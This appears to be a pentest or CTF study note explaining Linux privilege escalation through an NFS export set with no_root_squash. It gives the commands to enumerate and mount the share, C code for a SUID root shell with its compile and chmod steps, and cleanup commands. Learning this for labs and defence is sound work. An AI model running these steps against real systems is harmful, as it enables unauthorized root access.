# Privilege Escaltion - NFS

## **📡 Privilege Escalation: Misconfigured NFS (no_root_squash)**

### **🧠 Concept**

NFS (Network File System) is a protocol that allows file sharing between systems. A **misconfigured NFS export** can be abused for privilege escalation — particularly when the **no_root_squash** option is set.

---

### **📁 What is no_root_squash?**

- By default, **NFS maps root user to nfsnobody**, stripping root-level permissions.
- With no_root_squash, NFS **doesn’t downgrade root**, meaning **root-owned files retain root privileges**, even across the network.

---

### **🔍 Step-by-Step Exploitation**

### **✅ 1. Enumerate NFS Exports**

From the attacker machine:

```
showmount -e [target-ip]
```

Check /etc/exports on the target:

```
cat /etc/exports
```

Look for:

```
/exported/path *(rw,sync,no_root_squash)
```

---

### **📌 2. Mount the Share Locally**

```
mkdir /tmp/nfs
sudo mount [target-ip]:/exported/path /tmp/nfs
```

> You’re now directly interacting with the NFS share from your machine.
> 

---

### **⚒️ 3. Create a SUID Root Shell**

**Write C Code (nfs.c)**:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

**Compile and Set SUID Bit**:

```
gcc nfs.c -o nfs
chmod +s nfs
```

> Because of no_root_squash, this will
> 
> 
> **retain the SUID bit and ownership**
> 

---

### **🚀 4. Execute on Target Machine**

Once mounted:

```
ls -l /exported/path/nfs
-rwsr-xr-x 1 root root  16500 Jul 31  nfs
```

Now on the **target**:

```
./nfs
```

You’ll get a **root shell**.

---

### **🚨 Real-World vs CTF Note**

- In real networks, this is rare but possible on **legacy systems or misconfigured backups**.
- In **CTFs and exams**, this is a **common misconfiguration**, especially in beginner/intermediate labs.

---

### **🧼 Cleanup Tip**

After exploitation:

```
rm /tmp/nfs/nfs /tmp/nfs/nfs.c
umount /tmp/nfs
```

---

### **🔐 Summary**

| **Element** | **Description** |
| --- | --- |
| 🔍 Vector | Misconfigured NFS with no_root_squash |
| 🎯 Goal | Create root-owned SUID binary |
| 🧰 Tools Used | showmount, mount, gcc, chmod |
| ⚠️ Risk | Full root access via writable share |

---